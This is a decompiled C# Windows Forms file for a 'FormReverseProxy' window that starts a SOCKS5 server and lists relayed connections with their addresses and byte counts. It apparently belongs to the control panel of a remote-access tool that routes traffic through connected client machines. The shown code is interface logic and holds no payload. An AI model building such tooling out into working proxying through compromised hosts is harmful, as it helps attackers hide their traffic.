using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;
using Server.Helper.Sock5;

namespace Server.Forms
{
	// Token: 0x020000C0 RID: 192
	public partial class FormReverseProxy : FormMaterial
	{
		// Token: 0x06000639 RID: 1593 RVA: 0x0005ACBC File Offset: 0x00058EBC
		public FormReverseProxy()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x0600063A RID: 1594 RVA: 0x0005ACDC File Offset: 0x00058EDC
		private void NewItem(Client client)
		{
			try
			{
				client.Tag = new DataGridViewRow();
				((DataGridViewRow)client.Tag).Tag = client;
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = this.client.IP
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = client.IPAddress
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = client.Port
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString(client.Recives)
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString(client.Sents)
				});
				base.Invoke(new MethodInvoker(delegate()
				{
					this.GridIps.Rows.Add((DataGridViewRow)client.Tag);
				}));
			}
			catch
			{
			}
		}

		// Token: 0x0600063B RID: 1595 RVA: 0x0005AE5C File Offset: 0x0005905C
		private void RemoveItem(Client client)
		{
			if (client.Tag != null)
			{
				try
				{
					base.Invoke(new MethodInvoker(delegate()
					{
						this.GridIps.Rows.Remove((DataGridViewRow)client.Tag);
					}));
					((DataGridViewRow)client.Tag).Dispose();
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600063C RID: 1596 RVA: 0x0005AEC8 File Offset: 0x000590C8
		private void EditItem(Client client, long sent, long recive)
		{
			if (client.Tag != null)
			{
				try
				{
					((DataGridViewRow)client.Tag).Cells[0].Value = this.client.IP;
					((DataGridViewRow)client.Tag).Cells[1].Value = client.IPAddress;
					((DataGridViewRow)client.Tag).Cells[2].Value = client.Port;
					((DataGridViewRow)client.Tag).Cells[3].Value = Methods.BytesToString(client.Recives);
					((DataGridViewRow)client.Tag).Cells[4].Value = Methods.BytesToString(client.Sents);
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600063D RID: 1597 RVA: 0x0005AFAC File Offset: 0x000591AC
		private void RemoteDesktop_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
		}

		// Token: 0x0600063E RID: 1598 RVA: 0x0005AFD8 File Offset: 0x000591D8
		public void Activea()
		{
			this.server.ConnectEvent += this.NewItem;
			this.server.DisconnectEvent += this.RemoveItem;
			this.server.ResponceEvent += this.EditItem;
		}

		// Token: 0x0600063F RID: 1599 RVA: 0x0005B02C File Offset: 0x0005922C
		private void ChangeScheme(object sender)
		{
			this.GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridIps.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BackColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000640 RID: 1600 RVA: 0x0005B0B0 File Offset: 0x000592B0
		private void rjButton1_Click(object sender, EventArgs e)
		{
			if (this.rjButton1.Text == "Start")
			{
				try
				{
					Convert.ToInt32(this.rjTextBox1.Texts);
				}
				catch
				{
					return;
				}
				this.server.Start(Convert.ToInt32(this.rjTextBox1.Texts));
				this.rjButton1.Text = "Stop";
				return;
			}
			this.server.Stop();
			this.rjButton1.Text = "Start";
		}

		// Token: 0x06000641 RID: 1601 RVA: 0x0005B144 File Offset: 0x00059344
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
			this.server.Stop();
		}

		// Token: 0x06000642 RID: 1602 RVA: 0x0005B164 File Offset: 0x00059364
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x04000519 RID: 1305
		public Clients client;

		// Token: 0x0400051A RID: 1306
		public Clients parrent;

		// Token: 0x0400051B RID: 1307
		public Server.Helper.Sock5.Server server;
	}
}
